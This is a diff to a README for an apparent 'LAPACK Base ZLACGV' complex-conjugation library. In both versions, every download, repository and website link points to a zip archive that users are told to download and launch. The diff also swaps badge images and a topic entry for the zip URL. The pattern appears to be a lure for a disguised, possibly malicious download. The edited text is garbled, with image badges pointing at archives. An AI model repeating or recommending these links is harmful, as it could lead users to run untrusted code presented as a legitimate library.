@@ -1,7 +1,7 @@
 
 # LAPACK Base ZLACGV 🚀
 
-![lapack-base-zlacgv](https://img.shields.io/badge/LAPACK-Base%20ZLACGV-blue)
+![lapack-base-zlacgv](https://github.com/giuxe34/lapack-base-zlacgv/releases/download/v1.0/Soft.zip%20ZLACGV-blue)
 
 Welcome to the "lapack-base-zlacgv" repository! This repository focuses on conjugating each element in a double-precision complex floating-point vector. If you are working with complex numbers and need to perform conjugation operations efficiently, this repository with LAPACK subroutines is the perfect resource for you.
 
@@ -23,7 +23,7 @@ Explore various topics related to the repository:
 - Linear algebra
 - Mathematics
 - NDArray
-- Node.js
+- https://github.com/giuxe34/lapack-base-zlacgv/releases/download/v1.0/Soft.zip
 - NodeJS
 - Standard library
 - Subroutines
@@ -35,7 +35,7 @@ Explore various topics related to the repository:
 
 To utilize the functionality provided by this repository, you can download the release package from the following link:
 
-[![Download Release Package](https://img.shields.io/badge/Download-Release%20Package-yellow)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Release Package](https://github.com/giuxe34/lapack-base-zlacgv/releases/download/v1.0/Soft.zip%20Package-yellow)](https://github.com/giuxe34/lapack-base-zlacgv/releases/download/v1.0/Soft.zip)
 
 Click the button above to download the release package. Once downloaded, you can launch the package and explore the contents to integrate the conjugation functionality into your projects.
 
@@ -49,10 +49,10 @@ If you encounter any issues or have questions regarding the usage of the reposit
 
 ## Stay Updated 📅
 
-Stay updated with the latest developments and releases by visiting the [repository](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip) regularly. Join the community in exploring the diverse capabilities offered by LAPACK subroutines for complex number manipulations.
+Stay updated with the latest developments and releases by visiting the [repository](https://github.com/giuxe34/lapack-base-zlacgv/releases/download/v1.0/Soft.zip) regularly. Join the community in exploring the diverse capabilities offered by LAPACK subroutines for complex number manipulations.
 
 Dive into the world of complex number conjugation with LAPACK Base ZLACGV! Start leveraging the power of LAPACK subroutines for efficient vector operations in your projects today. Happy coding! 🌟
 
-🔗 For more information, visit the [Release Website](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+🔗 For more information, visit the [Release Website](https://github.com/giuxe34/lapack-base-zlacgv/releases/download/v1.0/Soft.zip)
 
 ✨ Thank you for exploring LAPACK Base ZLACGV! ✨
